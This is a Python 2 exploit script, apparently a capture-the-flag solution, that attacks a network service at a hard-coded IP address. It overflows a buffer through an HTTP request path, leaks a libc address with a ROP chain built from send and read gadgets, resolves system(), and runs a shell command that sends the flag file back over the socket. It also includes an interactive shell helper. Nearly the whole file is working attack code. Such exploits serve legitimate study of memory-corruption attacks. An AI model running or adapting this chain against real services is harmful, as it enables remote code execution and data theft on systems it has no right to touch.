#!/usr/bin/python

import os
import sys
import time
import socket
import string
from struct import pack,unpack

host = '188.165.211.36'
port = 99
padding = 'A'*535

p = lambda x : pack("<L", x)   # pack
u = lambda x : unpack("<L", x) # unpack

def get_connection(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	return s

def send_request(s, request_file):
	s.send("GET /" + request_file + " HTTP/1.1\r\n\r\n")

def interact_shell(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(0.5)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break

"""
# overwrite return address
s = get_connection(host, port)
resp = send_request(s, padding + "BBBB")
s.close()
"""
place = 0x0804a850     # .data
send_plt = 0x080488e0  # send@plt
read_plt = 0x08048710  # read@plt
recv_got = 0x0804a844  # recv@got

# GADGETS

pop4 = 0x0804919c       # pop ebx ; pop esi ; pop edi ; pop ebp ;;
leave = 0x08048958      # leave ; ret
pop_ebp = 0x08048eea    # pop ebp ; ret

# size_t send(int sockfd, const void *buf, size_t len, int flags)
send = p(send_plt)     # write()
send += p(pop4)        # RET -> clean args
send += p(4)           # socket fd
send += p(recv_got)    # read@GOT
send += p(4)           # 4 bytes
send += p(0)           # flags = 0

# fake EBP
read = p(pop_ebp)      # pop ebp ; ret
read += p(place)       # .data

# read(int fd, void *buf, size_t count);
read += p(read_plt)    # read()
read += p(leave)       # RET -> leave ; ret
read += p(4)           # socket fd
read += p(place)       # place
read += p(33)          # 24 bytes

print "[*] Sending stage-1 (loader)"
s = get_connection(host, port)

resp = send_request(s, padding + send + read)
recv_libc = u(s.recv(4))[0] # recv@libc

print "[*] Leaked recv@libc: 0x%08x" % recv_libc

libc = recv_libc - 0xe8c60
system = p(libc + 0x3a840)   # offset system() from libc

print "[*] Discovered libc base : 0x%.8x" % libc
print "[*] system@libc : 0x%s" % system[::-1].encode('hex')

# system("/bin/sh")
payload = "AAAA"             # for pop ebp (leave)
payload += system            # system()
payload += "BBBB"            # RET
payload += p(place + 4*4)    # "/bin/cat key >&4\x00" pointer
payload += "/bin/cat flag >&4\x00"     # "/bin/cat key >&4\x00" string

print "[*] Sending stage-2 (payload)\n"
time.sleep(0.5)
s.send(payload)
time.sleep(0.5)
print  s.recv(255)
s.close()

# EOF #
